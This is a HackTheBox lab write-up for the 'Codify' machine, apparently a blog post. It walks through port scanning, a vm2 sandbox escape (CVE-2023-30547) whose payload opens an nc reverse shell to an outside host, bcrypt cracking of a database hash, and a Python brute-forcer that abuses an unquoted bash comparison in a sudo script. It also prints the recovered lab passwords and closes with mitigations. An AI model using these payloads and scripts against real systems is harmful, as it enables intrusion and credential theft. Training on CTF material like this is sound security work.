---
title: "Codify - HackTheBox"
description: "Writeup of the Codify machine from HackTheBox, an easy Linux machine involving vm2 sandbox exploitation and privilege escalation via bash script."
pubDate: 2024-11-02
platform: "htb"
category: "machines"
difficulty: "easy"
os: "linux"
language: en
tags: ["vm2", "sandbox-escape", "bash", "password-cracking", "CVE-2023-30547"]
retired: false
logo: "/images/writeups/htb/codify/logo.png"
heroImage: "/images/writeups/htb/codify/card.png"
attackVectors: ["web"]
techniques: ["T1190", "T1068", "T1059.004"]
vulnerabilities: ["CVE-2023-30547"]
certifications: ["OSCP", "eJPT"]
skillLevel: "beginner"
estimatedTime: "1-2 hours"
points: 20
rating: 4.5
---

# Codify - HackTheBox Writeup

**Difficulty**: Easy  
**OS**: Linux  
**Platform**: HackTheBox  
**IP**: 10.10.11.239

## Introduction

Codify is an easy Linux machine featuring a web service that allows executing Node.js code in a vm2 sandbox. We'll exploit a known vulnerability to escape the sandbox and then escalate privileges through analysis of a vulnerable bash script.

## Reconnaissance

### Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.239 -oG allPorts
```

**Open ports:**
- 22/tcp - SSH
- 80/tcp - HTTP
- 3000/tcp - HTTP (Node.js)

### Service Scanning

```bash
nmap -p22,80,3000 -sCV 10.10.11.239 -oN targeted
```

**Results:**
- **22/tcp** - OpenSSH 8.9p1 Ubuntu
- **80/tcp** - Apache httpd 2.4.52
- **3000/tcp** - Node.js Express framework

## Web Enumeration

Accessing port 80, we find a website offering a "Node.js Code Editor" that allows running Node.js code in a sandbox environment.

### Identified Technologies

The site mentions using **vm2** to create a secure sandbox. Upon investigation, we discover that vm2 has a critical vulnerability: **CVE-2023-30547**.

## Exploitation

### CVE-2023-30547 - vm2 Sandbox Escape

This vulnerability allows escaping the vm2 sandbox and executing arbitrary code on the system.

**Payload:**

```javascript
const {VM} = require("vm2");
const vm = new VM();

const code = `
const err = new Error();
err.name = {
  toString: new Proxy(() => "", {
    apply(target, thiz, args) {
      const process = args.constructor.constructor('return process')();
      throw process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.5 443 >/tmp/f').toString();
    },
  }),
};
try {
  err.stack;
} catch (stdout) {
  stdout;
}
`;

console.log(vm.run(code));
```

### Reverse Shell

1. Set up a listener:

```bash
nc -lvnp 443
```

2. Execute the exploit in the web editor
3. Get shell as user `svc`

### TTY Treatment

```bash
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
```

## Post-Exploitation

### System Enumeration

```bash
id
whoami
ls -la /home
```

Users found:
- svc
- joshua

### SQLite Database

Exploring the system, we find a database in `/var/www/contact/`:

```bash
cd /var/www/contact
ls -la
```

We find `tickets.db`. Let's examine it:

```bash
sqlite3 tickets.db
.tables
SELECT * FROM users;
```

**Credential found:**
- User: joshua
- Hash: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

### Hash Cracking

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

or with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Cracked password:** spongebob1

### SSH as joshua

```bash
ssh joshua@10.10.11.239
# Password: spongebob1
```

**User flag:**
```bash
cat /home/joshua/user.txt
```

## Privilege Escalation

### Sudo Privileges Enumeration

```bash
sudo -l
```

We find that joshua can execute `/opt/scripts/mysql-backup.sh` as root.

### Script Analysis

```bash
cat /opt/scripts/mysql-backup.sh
```

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

echo "Enter MySQL password for $DB_USER:"
read -s USER_PASS

if [[ $DB_PASS == $USER_PASS ]]; then
        echo "Password confirmed!"
else
        echo "Password confirmation failed!"
        exit 1
fi
```

### Vulnerability in Comparison

The script uses `==` in bash without quotes, which allows pattern matching. We can exploit this with a character-by-character brute force attack.

### Exploitation Script

```python
#!/usr/bin/env python3
import subprocess
import string

charset = string.ascii_letters + string.digits
password = ""

while True:
    found = False
    for char in charset:
        test_pass = password + char + "*"
        cmd = f"echo '{test_pass}' | sudo /opt/scripts/mysql-backup.sh"
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if "Password confirmed!" in result.stdout:
            password += char
            print(f"[+] Password so far: {password}")
            found = True
            break
    
    if not found:
        break

print(f"[+] Final password: {password}")
```

**Root password:** kljh12k3jhaskjh12kjh3

### Root Shell

```bash
su root
# Password: kljh12k3jhaskjh12kjh3
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusion

Codify is an excellent machine to practice:
- Exploiting sandbox vulnerabilities (CVE-2023-30547)
- SQLite database analysis
- Bcrypt hash cracking
- Bash script analysis and exploiting insecure comparisons
- Timing/pattern matching attacks

**Lessons Learned:**
- Sandbox implementations can have critical vulnerabilities
- Always validate credentials securely in scripts
- Use quotes in bash comparisons to avoid pattern matching
- Thorough enumeration is key to finding escalation vectors

**Mitigations:**
- Update vm2 to the latest version
- Use secure comparisons in bash with double quotes
- Don't store passwords in plain text
- Implement rate limiting on sensitive operations
